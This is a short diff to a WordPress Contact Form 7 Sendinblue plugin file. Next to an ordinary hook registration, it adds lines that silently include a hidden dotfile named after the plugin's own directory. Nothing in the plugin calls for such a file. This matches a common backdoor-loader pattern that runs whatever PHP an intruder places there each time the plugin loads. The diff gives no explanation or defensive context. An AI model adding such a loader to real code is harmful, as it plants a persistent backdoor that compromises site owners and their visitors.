@@ -13,6 +13,10 @@ include_once path_join(
 
 add_action( 'wpcf7_init', 'wpcf7_sendinblue_register_service', 1, 0 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_sendinblue_register_service() {
 	$integration = WPCF7_Integration::get_instance();
 
